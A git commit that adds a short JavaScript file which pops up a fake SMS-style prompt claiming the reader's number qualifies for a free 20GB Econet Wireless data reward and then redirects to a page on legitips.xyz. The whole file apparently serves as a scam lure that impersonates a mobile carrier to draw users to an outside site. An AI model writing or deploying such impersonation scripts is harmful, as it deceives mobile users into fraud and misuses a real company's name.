efd93a6d81406b9473d34c61271277f693fc1fec
legitips <83867893+legitips@users.noreply.github.com>
2024-10-08 16:17:56 -0700

    Create activation-econetrewards.js

---
+++ activation-econetrewards.js
@@ -0,0 +1,5 @@
+var password = '20GB Free Data'
+password=prompt('SMS: Congratulations Your Number is Eligible to receive 20GB Free Data ECONET WIRELESS REWARD, Kindly Press OK to ACTIVATE. ','20GB Free Data');
+if (password != '20GB Free Data') {
+location.href='https://legitips.xyz/https://legitips.xyz/econetrewards.html';
+}
